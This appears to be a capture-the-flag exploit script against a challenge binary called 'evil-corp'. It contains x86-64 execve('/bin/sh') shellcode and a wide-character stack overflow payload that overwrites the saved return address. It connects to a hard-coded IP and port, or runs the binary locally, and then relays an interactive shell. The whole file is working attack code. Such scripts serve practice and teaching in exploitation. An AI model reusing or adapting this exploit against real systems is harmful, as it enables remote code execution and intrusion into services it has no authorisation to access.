#!/usr/bin/env python3
import os
import socket
import subprocess
import sys
import threading


HOST = "154.57.164.67"
PORT = 31126

# execve("/bin//sh", NULL, NULL), padded to an even byte count because the
# program copies the low 16 bits of every wchar_t into the executable mapping.
SHELLCODE = bytes.fromhex(
    "48 31 f6 56 48 bf 2f 62 69 6e 2f 2f 73 68 57 54 "
    "5f 6a 3b 58 99 0f 05 90"
)


def as_wchars(raw: bytes) -> str:
    assert len(raw) % 2 == 0
    return "".join(chr(int.from_bytes(raw[i:i + 2], "little"))
                   for i in range(0, len(raw), 2))


def payload() -> bytes:
    # ContactSupport's saved RIP is 0x3e88 bytes (4002 wchar_t elements)
    # after its input buffer. wcharToChar16 writes two bytes per input wchar,
    # so element 2048 is exactly the executable page at 0x11000.
    sled = chr(0x9090)
    chars = sled * 2050 + as_wchars(SHELLCODE)
    chars += sled * (4002 - len(chars))

    # Low dword of saved RIP = 0x11000. An embedded NUL supplies a zero high
    # dword; fgetws accepts it, while wcharToChar16 stops there after copying
    # the already-built code page.
    return chars.encode("utf-8") + chr(0x11000).encode("utf-8") + b"\x00\n"


def interact(sock):
    def reader():
        while True:
            data = sock.recv(4096)
            if not data:
                break
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()

    receive_thread = threading.Thread(target=reader)
    receive_thread.start()
    while True:
        data = sys.stdin.buffer.read1(4096)
        if not data:
            break
        sock.sendall(data)
    receive_thread.join()


def remote():
    sock = socket.create_connection((HOST, PORT))
    sock.sendall(b"eliot\n4007\n2\n" + payload())
    interact(sock)


def local(command=b"echo PWNED; exit\n"):
    binary = os.path.join(os.path.dirname(__file__),
                          "Evil Corp", "pwn_evil_corp", "evil-corp")
    proc = subprocess.Popen([binary], stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    out, _ = proc.communicate(b"eliot\n4007\n2\n" + payload() + command,
                              timeout=5)
    sys.stdout.buffer.write(out)
    return proc.returncode


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "local":
        raise SystemExit(local())
    remote()
